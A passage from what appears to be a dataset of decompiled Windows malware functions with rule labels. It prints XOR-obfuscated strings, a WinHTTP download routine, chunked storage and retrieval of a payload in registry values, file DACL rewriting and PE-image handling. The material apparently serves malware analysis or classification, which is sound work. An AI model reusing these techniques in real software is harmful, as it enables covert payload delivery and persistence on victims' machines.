code_r0x0040b444;\n        }\n        if (arg_8h == 0x140) {\n            var_fch = 0x30;\n            goto code_r0x0040b43a;\n        }\n    }\n    var_3ch = &var_104h;\n    if (lpdwNumberOfBytesAvailable != NULL) {\n        var_3ch = lpdwNumberOfBytesAvailable;\n    }\n    iVar5 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        return 3;\n    }\n    arg_8h = 6;\n    var_f8h = 5;\n    if (*0x41cd30 == 0) {\n        var_e8h = 0x4c3e6a2c;\n        var_e4h = 0x6a08780b;\n        var_e0h = 0x781d4c3d;\n        var_dch = 0x4c7e6a00;\n        var_d8h = 0x6a4f7844;\n        var_d4h = 0x78514c61;\n        var_d0h._0_2_ = 0x6a49;\n        var_d0h._2_1_ = 6;\n        stack0xffffff2f = 0xf78184c;\n        var_c9h = 0x1e4c356a;\n        var_c5h = 0x226a1678;\n        var_c1h = 0x2f78514c;\n        var_bdh._0_1_ = 0x6a;\n        var_bdh._1_1_ = 5;\n        stack0xffffff41 = 0x5778514c;\n        var_b7h = 0x404c7f6a;\n        var_b3h = 0x716a5a78;\n        var_afh = 0x878264c;\n        var_abh = 0x474c3f6a;\n        var_a7h = 0x6a6a5578;\n        var_a3h = 0x1978514c;\n        var_9fh = 0x454c676a;\n        var_9bh = 0x716a5a78;\n        var_97h = 0x1778034c;\n        var_93h = 0x434c6b6a;\n        var_8fh = 0x7f6a5478;\n        var_8bh = 0x4878414c;\n        var_87h = 0x364c716a;\n        var_83h = 0x326a0478;\n        var_7fh = 0xe781a4c;\n        var_7bh = 0x434c7e6a;\n        var_77h = 0x616a5078;\n        var_73h = 0x5178414c;\n        var_6fh = 0x414c606a;\n        var_6bh = 0x716a5078;\n        var_67h = 0x878374c;\n        var_63h = 0x144c236a;\n        var_5fh = 0x3e6a0778;\n        var_5bh = 0x4e78094c;\n        var_57h = 0x444c636a;\n        var_53h = 0x616a4f78;\n        var_4fh._0_2_ = 0x714c;\n        var_4fh._2_1_ = 0x78;\n        var_8h = 0x4c516a61;\n        var_4h = CONCAT22(var_4h._2_2_, 0x7871);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        lpdwNumberOfBytesAvailable = NULL;\n        var_48h = &var_e8h - iVar5;\n        do {\n            *(lpdwNumberOfBytesAvailable + iVar5) =\n                 *(&var_8h + lpdwNumberOfBytesAvailable % 6) ^ (lpdwNumberOfBytesAvailable + iVar5)[&var_e8h - iVar5];\n            lpdwNumberOfBytesAvailable = lpdwNumberOfBytesAvailable + 1;\n        } while (lpdwNumberOfBytesAvailable < 0x9c);\n        *0x41cd30 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar5, 0, 0, 0, 0);\n        if (*0x41cd30 == 0) {\n            uVar3 = (*pcVar7)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return 1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41cd30, 5000, 5000, 5000, 5000);\n        uVar3 = (*pcVar7)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar3 = (*pcVar7)(8, (iVar5 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                  (0, 0, lpMultiByteStr, 0xffffffff, lpdwNumberOfBytesAvailable, iVar5 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41cd30, lpdwNumberOfBytesAvailable, 0x50, 0);\n    var_30h = 0x5a15385f;\n    var_2ch = 0x61483737;\n    var_28h = 0x380d4329;\n    var_24h = 0x376c5a4e;\n    var_20h = 0x4329611d;\n    var_1ch = 0x5a44380d;\n    var_18h = 0x61173727;\n    var_14h._0_2_ = 0x435a;\n    var_8h = 0x5a613837;\n    var_4h = CONCAT31(var_4h._1_3_, 0x43);\n    uVar3 = (*pcVar7)(8, 0x3d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_48h = iVar5;\n    hRequest = &var_30h - iVar5;\n    do {\n        puVar1 = iVar9 + iVar5;\n        iVar6 = iVar9 % var_f8h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_30h - iVar5];\n    } while (iVar9 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, lpdwNumberOfBytesAvailable, 0x50);\n    uVar3 = (*pcVar7)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    if (lpMultiByteStr == 0) {\n        arg_8h = 1;\n        goto code_r0x0040bb29;\n    }\n    if (var_3ch == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_3ch);\n        uVar3 = (*pcVar7)(8, (iVar5 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, var_3ch, 0xffffffff, lpdwNumberOfBytesAvailable, iVar5 + 1);\n    }\n    var_40h = 0x372c3573;\n    var_3ch = 0x3534730d;\n    var_8h = 0x37693534;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7359);\n    uVar3 = (*pcVar7)(8, 0x11);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    puVar2 = lpdwNumberOfBytesAvailable;\n    iVar5 = 0;\n    hRequest = &var_40h - iVar9;\n    do {\n        puVar1 = iVar5 + iVar9;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_40h - iVar9];\n    } while (iVar5 < 8);\n    var_f8h = iVar9;\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                      (lpMultiByteStr, iVar9, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = iVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    iVar5 = var_48h;\n    if (iVar6 == 0) {\ncode_r0x0040bb02:\n        arg_8h = 1;\n    }\n    else {\n        var_108h = 0x3300;\n        var_10ch = 8;\n        iVar4 = fcn.004078a6();\n        if (iVar4 != 0) {\n            var_4h = 0;\n            var_8h = &var_418h;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x1f, &var_108h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x3f, &var_10ch, 4);\n        if (lpdwNumberOfBytesRead != 0) {\n            var_34h = 0x650f342a;\n            var_30h = 0x341f443e;\n            var_2ch = 0x446a650b;\n            var_28h = 0x650c3458;\n            var_24h = 0x340c4429;\n            var_20h = 0x4423650b;\n            var_1ch = 0x654b3445;\n            var_18h = 0x34554434;\n            var_14h._0_2_ = 0x656e;\n            var_8h = 0x656e3478;\n            var_4h = CONCAT22(var_4h._2_2_, 0x4450);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = 0;\n            lpdwNumberOfBytesAvailable = &var_34h - iVar5;\n            do {\n                puVar1 = iVar9 + iVar5;\n                iVar6 = iVar9 % 6;\n                iVar9 = iVar9 + 1;\n                *puVar1 = *(&var_8h + iVar6) ^ *(lpdwNumberOfBytesAvailable + puVar1);\n            } while (iVar9 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, lpdwNumberOfBytesRead);\n            uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            iVar6 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar5 = var_48h;\n            iVar9 = var_f8h;\n        }\n        iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(iVar6, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar4 == 0) || (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar6, 0),  iVar4 == 0))\n        goto code_r0x0040bb02;\n        lpdwBufferLength = 4;\n        var_f4h = 0;\n        var_f0h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar6, 0x20000005, 0, &var_f4h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f4h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar6, 0x20000013, 0, &var_f0h, &lpdwBufferLength, 0);\n        if ((var_f0h == 0xce) || (var_f0h == 200)) {\n            if (var_44h[1] == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f4h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                *var_44h = 0;\n                var_44h[1] = iVar4;\n            }\n            hRequest = var_44h[1];\n            lpdwNumberOfBytesRead = 0;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(iVar6, &lpdwNumberOfBytesAvailable);\n                if ((iVar4 == 0) ||\n                   (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (iVar6, *var_44h + hRequest, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar4 == 0)) {\n                    arg_8h = 4;\n                    goto code_r0x0040bb09;\n                }\n                *var_44h = *var_44h + lpdwNumberOfBytesRead;\n                iVar4 = *var_44h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar4;\n            if ((*arg_10h == 0) || (iVar4 == *arg_10h)) {\n                arg_8h = 0;\n            }\n        }\n        else {\n            arg_8h = 3;\n        }\n    }\ncode_r0x0040bb09:\n    if (iVar6 != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n    }\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\ncode_r0x0040bb29:\n    uVar3 = (*pcVar7)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return arg_8h;\n}\n",
        "token_count": 4576
    },
    "0040db77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040db77(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "0040de95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040de95(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint *puVar8;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    int32_t *var_54h;\n    uint32_t var_50h;\n    int32_t hKey;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = var_28h & 0xffffff00;\n    var_54h = param_1;\n    var_24h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if ((((uVar3 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_5ch = uVar3;\n        fcn.0040e4fc();\n        hKey = fcn.0040e4a3(0x20006);\n        if (hKey != 0) {\n            var_48h = *param_1;\n            var_44h = 0x391a432d;\n            var_40h = 0x73224f58;\n            var_3ch = 0x4336364b;\n            var_38h = 0x4f5b393a;\n            var_34h = 0x365e7322;\n            var_30h = 0x3956432a;\n            var_50h = (((var_48h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar8 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_2ch = 0x73434f52;\n            puVar8 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_8h = 0x3973434f;\n            var_4h._0_1_ = 0x36;\n            uVar2 = (*pcVar7)(8, 0x39);\n            var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar4 = 0;\n            do {\n                var_14h = 5;\n                puVar1 = iVar4 + var_58h;\n                iVar5 = iVar4 % 5;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_44h - var_58h];\n            } while (iVar4 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_58h, var_24h);\n            var_8h = 0;\n            var_20h = 0x750a526c;\n            var_1ch = 0x526c4a14;\n            var_18h = 0x4a4b751d;\n            var_10h = 0x75795249;\n            var_ch._0_2_ = 0x4a4b;\n            var_24h = 6;\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar2 = (*pcVar7)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar5 = 0;\n                var_14h = &var_20h - iVar4;\n                do {\n                    puVar1 = iVar5 + iVar4;\n                    iVar6 = iVar5 % var_24h;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = *(&var_10h + iVar6) ^ puVar1[&var_20h - iVar4];\n                } while (iVar5 < 0xc);\n                puVar8 = &lpValueName;\n                for (iVar5 = 0x40; iVar6 = var_8h,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_8h);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                var_8h = iVar6 + 1;\n            } while (var_8h < 0x32);\n            var_14h = 0;\n            if (0 < var_50h) {\n                var_8h = 0;\n                var_20h = 0x750a526c;\n                var_1ch = 0x526c4a14;\n                var_18h = 0x4a4b751d;\n                var_10h = 0x75795249;\n                var_ch._0_2_ = 0x4a4b;\n                do {\n                    uVar2 = (*pcVar7)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar5 = 0;\n                    var_28h = &var_20h - iVar4;\n                    do {\n                        puVar1 = iVar5 + iVar4;\n                        iVar6 = iVar5 % var_24h;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_10h + iVar6) ^ puVar1[&var_20h - iVar4];\n                    } while (iVar5 < 0xc);\n                    puVar8 = &lpValueName;\n                    for (iVar5 = 0x40; iVar6 = var_14h,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar8 = 0;\n                        puVar8 = puVar8 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_14h);\n                    iVar5 = 0x7d000;\n                    if (var_48h < 0x7d000) {\n                        iVar5 = var_48h;\n                    }\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_54h[1] + var_8h, iVar5);\n                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_28h = -iVar5 & 0xffffff00U | 1 - (iVar5 != 0);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    var_14h = iVar6 + 1;\n                    var_8h = var_8h + 0x7d000;\n                    var_48h = var_48h + -0x7d000;\n                } while (var_14h < var_50h);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar2 = (*pcVar7)(0, var_58h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar3 = var_5ch;\n        }\n        uVar2 = (*pcVar7)(0, uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return uVar3 & 0xffffff00 | var_28h & 0xff;\n}\n",
        "token_count": 2091
    },
    "0040e1a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040e1a9(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    code *pcVar9;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uchar *var_60h;\n    int32_t *var_5ch;\n    int32_t var_58h;\n    uint lpType;\n    int32_t var_50h;\n    uchar *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpcbData;\n    int32_t hKey;\n    int32_t var_8h;\n    uint var_1h;\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_5ch = param_1;\n    hKey = param_2;\n    uVar2 = (*pcVar9)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_58h = iVar3;\n        fcn.0040e4fc();\n        var_6ch = fcn.0040e4a3(0x20019);\n        if (var_6ch != 0) {\n            var_50h = 0;\n            var_48h = 0x391a432d;\n            puVar7 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_44h = 0x73224f58;\n            puVar7 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_40h = 0x4336364b;\n            var_3ch = 0x4f5b393a;\n            var_38h = 0x365e7322;\n            var_34h = 0x3956432a;\n            var_30h = 0x73434f52;\n            var_20h = 0x3973434f;\n            var_1ch = CONCAT31(var_1ch._1_3_, 0x36);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar3 = 0;\n            do {\n                var_8h = 5;\n                puVar1 = iVar3 + var_70h;\n                iVar5 = iVar3 % 5;\n                iVar3 = iVar3 + 1;\n                *puVar1 = *(&var_20h + iVar5) ^ puVar1[&var_48h - var_70h];\n            } while (iVar3 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_70h, hKey);\n            var_2ch = 0x750a526c;\n            var_28h = 0x526c4a14;\n            var_24h = 0x4a4b751d;\n            var_18h = 0x75795249;\n            var_14h._0_2_ = 0x4a4b;\n            do {\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar7 = &var_20h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                puVar7 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar3 = var_50h;\n                iVar5 = 0;\n                hKey = &var_2ch - var_1ch;\n                do {\n                    var_8h = 6;\n                    puVar1 = iVar5 + var_1ch;\n                    iVar6 = iVar5 % 6;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_2ch - var_1ch];\n                } while (iVar5 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, var_1ch, &ARG_0, var_50h);\n                var_1h._0_1_ = '\\0';\n                var_4ch = NULL;\n                var_50h = iVar3 + 1;\n                var_8h = 0;\n                hKey = fcn.0040e4a3(0x20019);\n                param_1 = var_5ch;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = 0;\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    iVar3 = 0;\n                    if (iVar5 == 0) {\n                        uVar2 = (*pcVar9)(8, lpcbData);\n                        var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (var_60h == NULL) {\n                            puVar4 = NULL;\n                            iVar5 = 0;\n                        }\n                        else {\n                            iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_60h, &lpcbData);\n                            puVar4 = var_60h;\n                            iVar5 = lpcbData;\n                            if (iVar6 != 0) goto code_r0x0040e3e7;\n                        }\n                        var_1h._0_1_ = '\\x01';\n                        iVar3 = iVar5;\n                        var_4ch = puVar4;\n                        var_8h = iVar5;\n                    }\ncode_r0x0040e3e7:\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_4ch != NULL)) && (iVar3 != 0)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar9)(8, iVar3);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar9)(0, param_1[1], *param_1 + iVar3);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar4 = var_4ch;\n                        puVar8 = iVar3 + *param_1;\n                        for (iVar5 = var_8h; iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *puVar8 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar8 = puVar8 + 1;\n                        }\n                        *param_1 = *param_1 + var_8h;\n                        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4ch);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    }\n                }\n                uVar2 = (*pcVar9)(0, var_1ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_6ch);\n            uVar2 = (*pcVar9)(0, var_70h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar3 = var_58h;\n        }\n        uVar2 = (*pcVar9)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2209
    },
    "0040ee79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ee79(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.004058dc;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41ccc4 & 1) != 0)) {\n        var_20h = 0x41c7a8;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.00406924(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00406687(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.004067c9(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 